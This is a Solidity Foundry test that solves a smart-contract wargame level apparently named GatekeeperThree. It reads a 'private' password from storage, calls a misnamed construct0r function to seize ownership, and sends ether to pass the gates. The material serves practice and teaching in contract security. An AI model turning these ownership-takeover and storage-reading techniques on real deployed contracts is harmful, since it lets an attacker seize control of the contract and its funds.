// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level28.sol";
import "forge-std/Test.sol";

contract ExploitLevel28 is Test {
    GatekeeperThree instance = new GatekeeperThree();

    // In foundry tests, tx.origin is defaulted to 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
    // I can change this in foundry.toml but it make no sense in this case
    // See https://book.getfoundry.sh/reference/config/testing#tx_origin
    address player = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;

    function testExploit() external {
        vm.deal(player, 1 ether);

        vm.startPrank(player);

        AttackLevel attackContract = new AttackLevel();

        instance.createTrick();

        uint256 password = uint256(vm.load(address(instance.trick()), bytes32(uint256(2))));
        instance.getAllowance(password);
        address(instance).call{value: 0.0011 ether}("");

        attackContract.attack(instance);

        assertEq(instance.entrant(), player);

        vm.stopPrank();
    }
}

contract AttackLevel {
    function attack(GatekeeperThree _instance) external {
        _instance.construct0r();
        _instance.enter();
    }
}
